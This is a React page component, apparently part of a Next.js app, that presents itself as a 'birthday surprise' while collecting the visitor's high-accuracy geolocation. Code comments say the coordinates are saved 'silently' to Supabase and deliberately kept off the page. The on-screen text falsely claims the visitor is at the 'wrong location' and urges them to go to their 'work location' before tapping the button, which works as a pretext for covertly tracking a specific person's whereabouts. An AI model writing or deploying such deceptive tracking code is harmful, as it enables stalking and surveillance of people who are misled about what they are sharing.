
'use client';

import { useState } from 'react';

export default function LocationShare({ onLocationChecked }) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  async function checkLocation() {
    if (!navigator.geolocation) {
      setError('Location is not supported by your browser.');
      return;
    }

    setLoading(true);
    setError('');

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const payload = {
          label: 'Birthday location check',
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy_m: position.coords.accuracy,
        };

        try {
          // Save location silently to Supabase through your API
          const response = await fetch('/api/location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
          });

          const data = await response.json();

          if (!response.ok) {
            throw new Error(
              data.error || 'Unable to check your location.'
            );
          }

          // Don't show location data on the webpage.
          // Send the result back to Home if needed.
          if (onLocationChecked) {
            onLocationChecked({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              saved: data,
            });
          }
        } catch (error) {
          console.error(error);

          setError(
            'Something went wrong while checking your location. Please try again.'
          );
        } finally {
          setLoading(false);
        }
      },
      (error) => {
        setLoading(false);

        if (error.code === 1) {
          setError(
            'Please allow location access to see your birthday surprise.'
          );
        } else if (error.code === 2) {
          setError(
            'We could not determine your location. Please try again.'
          );
        } else if (error.code === 3) {
          setError(
            'Location request timed out. Please try again.'
          );
        } else {
          setError(
            'Could not check your location. Please try again.'
          );
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
      }
    );
  }

  return (
    <main className="page">
      <section className="card">
        {/* <div className="pin">📍</div> */}

        <h1>Hey... you're at the wrong location 💗</h1>

        <p>
          Your birthday surprise is waiting for you, but you're
          not at the right place yet. 😊
        </p>
      <p><strong>You're at the wrong location 💗</strong></p>
        <p>
          Go to your <strong>work location</strong> and come back
          here to unlock your surprise. 🎁
          
        </p>

        <button onClick={checkLocation} disabled={loading}>
          {loading
            ? 'Checking your location…'
            : 'See My Birthday Surprise 💗'}
        </button>

        {error && <div className="status">{error}</div>}

        <small>
          We'll check your location only when you tap the button.
        </small>
      </section>
    </main>
  );
}

